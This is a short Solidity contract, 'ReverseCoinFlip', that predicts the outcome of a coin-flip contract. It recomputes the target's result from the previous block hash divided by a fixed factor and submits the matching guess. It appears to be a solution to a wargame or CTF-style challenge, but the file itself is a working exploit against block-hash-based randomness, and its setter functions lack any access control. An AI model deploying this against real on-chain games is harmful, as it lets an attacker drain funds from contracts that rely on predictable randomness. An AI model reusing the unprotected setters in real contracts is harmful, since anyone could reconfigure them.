// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

import "./ICoinFlip.sol";

contract ReverseCoinFlip {
  uint256 public factor =
    57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address public coinFlipAddress;

  constructor(address _coinFlipAddress) {
    coinFlipAddress = _coinFlipAddress;
  }

  function predictFlip() public {
    uint256 coinFlip = uint256(blockhash(block.number - 1)) / factor;
    bool predictSide = coinFlip == 1;
    ICoinFlip(coinFlipAddress).flip(predictSide);
  }

  function setCoinFlipContract(address _address) public {
    coinFlipAddress = _address;
  }

  function setFactor(uint256 _factor) public {
    factor = _factor;
  }
}
